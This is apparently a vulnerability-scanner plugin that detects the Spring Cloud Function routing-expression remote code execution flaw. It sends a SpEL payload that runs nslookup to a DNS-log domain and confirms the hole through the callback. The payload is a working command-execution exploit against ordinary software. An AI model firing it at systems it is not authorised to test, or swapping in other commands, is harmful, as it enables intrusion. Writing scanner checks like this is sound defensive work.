#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    details = '影响版本： 3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2\n' \
              '参考链接： \n' \
              'https://www.anquanke.com/post/id/271221\n' \
              'https://github.com/spring-cloud/spring-cloud-function/' \
              'commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f\n'
    domain = dns_monitor(ip, port).add_checker('spring-cloud-function-rce',
                                               alert_group='Spring Cloud Function RCE',
                                               details=details)

    payload = 'T(java.lang.Runtime).getRuntime().exec("nslookup %s")' % domain
    headers = {"spring.cloud.function.routing-expression": payload}
    try:
        await http_client(ip, port).get("{}://{}:{}/".format(service, ip, port), headers=headers, timeout=10)
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8888, 'http', True, task_msg={})
    run_plugin_test(scan)
